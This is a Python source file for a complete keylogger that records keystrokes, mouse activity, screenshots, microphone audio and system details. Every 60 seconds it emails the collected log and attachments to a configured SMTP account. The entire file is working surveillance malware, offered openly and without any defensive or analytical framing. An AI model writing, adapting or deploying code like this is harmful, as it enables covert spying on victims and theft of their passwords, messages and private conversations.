import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import numpy as np
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime
import glob

# Configure logging to file for debugging
logging.basicConfig(
    filename="keylogger.log",
    level=logging.INFO,
    format="%(asctime)s - %(message)s"
)

try:
    # Attempt to import required modules
    import pyscreenshot
    import sounddevice
    import pynput
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot==0.5.1", "sounddevice==0.4.3", "pynput==1.7.3"]
    call("pip install " + ' '.join(modules), shell=True)

# Configuration (use environment variables in a real scenario)
EMAIL_ADDRESS = os.getenv("KEYLOGGER_EMAIL", "YOUR_USERNAME")
EMAIL_PASSWORD = os.getenv("KEYLOGGER_PASSWORD", "YOUR_PASSWORD")
SMTP_SERVER = os.getenv("SMTP_SERVER", "smtp.mailtrap.io")
SMTP_PORT = int(os.getenv("SMTP_PORT", 2525))
SEND_REPORT_EVERY = 60  # seconds
SAVE_DIR = "keylogger_data"

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.email = email
        self.password = password
        self.start_time = datetime.now()
        # Create directory for saving files
        if not os.path.exists(SAVE_DIR):
            os.makedirs(SAVE_DIR)

    def appendlog(self, string):
        self.log += str(string) + "\n"

    def on_move(self, x, y):
        current_move = f"Mouse moved to {x}, {y}"
        logging.info(current_move)
        self.appendlog(current_move)

    def on_click(self, x, y, button, pressed):
        current_click = f"Mouse {'pressed' if pressed else 'released'} at {x}, {y} with {button}"
        logging.info(current_click)
        self.appendlog(current_click)

    def on_scroll(self, x, y, dx, dy):
        current_scroll = f"Mouse scrolled at {x}, {y} by {dx}, {dy}"
        logging.info(current_scroll)
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = f"[{str(key)}]"
        self.appendlog(current_key)

    def send_mail(self, email, password, message, attachments=None):
        try:
            msg = MIMEMultipart()
            msg['From'] = f"KeyLogger <{email}>"
            msg['To'] = email
            msg['Subject'] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            msg.attach(MIMEText(message, 'plain'))

            # Attach files (e.g., screenshot, audio)
            if attachments:
                for file_path in attachments:
                    if os.path.exists(file_path):
                        with open(file_path, "rb") as f:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(f.read())
                            encoders.encode_base64(part)
                            part.add_header(
                                'Content-Disposition',
                                f'attachment; filename="{os.path.basename(file_path)}"'
                            )
                            msg.attach(part)

            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()
                server.login(email, password)
                server.send_message(msg)
            logging.info("Email sent successfully")
        except Exception as e:
            logging.error(f"Failed to send email: {e}")

    def report(self):
        try:
            # Collect attachments
            attachments = []
            screenshot_path = self.screenshot()
            audio_path = self.microphone()
            if screenshot_path:
                attachments.append(screenshot_path)
            if audio_path:
                attachments.append(audio_path)

            # Send email with log and attachments
            self.send_mail(self.email, self.password, self.log, attachments)
            self.log = ""  # Clear log after sending
            logging.info("Report sent")
        except Exception as e:
            logging.error(f"Report failed: {e}")
        # Schedule next report
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            info = f"System Info:\nHostname: {hostname}\nIP: {ip}\nProcessor: {plat}\nOS: {system}\nMachine: {machine}\n"
            self.appendlog(info)
            logging.info("System information collected")
        except Exception as e:
            logging.error(f"Failed to collect system info: {e}")

    def microphone(self):
        try:
            fs = 44100
            seconds = min(self.interval, 10)  # Limit recording to 10s for testing
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1, dtype='int16')
            sd.wait()  # Wait until recording is finished
            audio_path = os.path.join(SAVE_DIR, f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav")
            with wave.open(audio_path, 'wb') as obj:
                obj.setnchannels(1)
                obj.setsampwidth(2)
                obj.setframerate(fs)
                obj.writeframes(np.array(recording).tobytes())
            logging.info(f"Audio saved to {audio_path}")
            return audio_path
        except Exception as e:
            logging.error(f"Audio recording failed: {e}")
            return None

    def screenshot(self):
        try:
            img = pyscreenshot.grab()
            screenshot_path = os.path.join(SAVE_DIR, f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
            img.save(screenshot_path)
            logging.info(f"Screenshot saved to {screenshot_path}")
            return screenshot_path
        except Exception as e:
            logging.error(f"Screenshot failed: {e}")
            return None

    def run(self):
        try:
            # Collect system information once at start
            self.system_information()

            # Start keyboard listener
            keyboard_listener = KeyboardListener(on_press=self.save_data)
            mouse_listener = MouseListener(
                on_click=self.on_click,
                on_move=self.on_move,
                on_scroll=self.on_scroll
            )

            # Start listeners and reporting
            with keyboard_listener, mouse_listener:
                self.report()
                keyboard_listener.join()
                mouse_listener.join()
        except Exception as e:
            logging.error(f"Keylogger failed: {e}")

if __name__ == "__main__":
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()